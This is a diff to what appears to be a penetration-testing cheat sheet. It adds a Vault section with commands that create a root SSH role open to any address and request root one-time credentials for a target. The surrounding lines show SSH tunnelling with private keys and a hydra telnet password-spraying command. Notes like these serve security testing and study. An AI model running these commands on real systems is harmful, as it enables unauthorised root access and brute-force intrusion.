@@ -838,6 +838,12 @@ ssh $USERNAME@$TARGET -i id_ed25519 -L 33060:Localhost:33060 -L 5000:Localhost:5
 ssh $USERNAME@$TARGET -i id_rsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
 
++---------- Vault ----------+
+vault secrets enable ssh
+vault list ssh/roles
+vault write ssh/roles/root default_user=root key_type=otp cidr_list=0.0.0.0/0
+vault write ssh/creds/root ip=$TARGET
+
 [*] (23) Telnet
 +---------- Spray Service ----------+
 (hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
